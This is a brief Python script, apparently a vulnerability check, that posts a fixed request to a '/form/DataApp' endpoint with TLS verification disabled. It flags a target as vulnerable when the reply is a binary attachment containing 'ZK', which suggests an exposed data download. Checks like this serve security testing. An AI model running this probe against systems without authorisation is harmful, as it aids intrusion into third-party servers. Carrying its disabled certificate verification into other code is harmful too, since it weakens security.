import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"form/DataApp"
	body="style=1"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if response.status_code == 200 and "application/binary" in response.headers["Content-Type"] and "ZK" in response.text and "attachment" in response.headers["Content-Disposition"]:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
